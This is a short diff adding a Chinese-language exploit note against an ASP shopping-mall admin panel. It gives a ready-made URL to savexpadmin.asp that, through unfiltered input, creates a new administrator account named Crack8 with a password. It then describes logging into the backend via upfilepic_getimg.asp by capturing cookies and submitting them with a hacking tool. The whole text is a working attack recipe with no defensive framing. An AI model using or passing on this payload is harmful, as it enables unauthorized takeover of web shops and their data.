@@ -1,0 +1,6 @@
+savexpadmin.asp未过滤外部提交数据：
+http://127.0.0.1/admin/savexpadmin.asp?action=add&admin2=Crack8&password2=k8team0&Submit2=%CC%ED%BC%D3%B9%DC%C0%ED%D4%B1
+增加用户：Crack8密码为k8team的用户
+登入后台：
+http://127.0.0.1/upfilepic_getimg.asp
+抓取cookies使用明小子动感购物商城提交
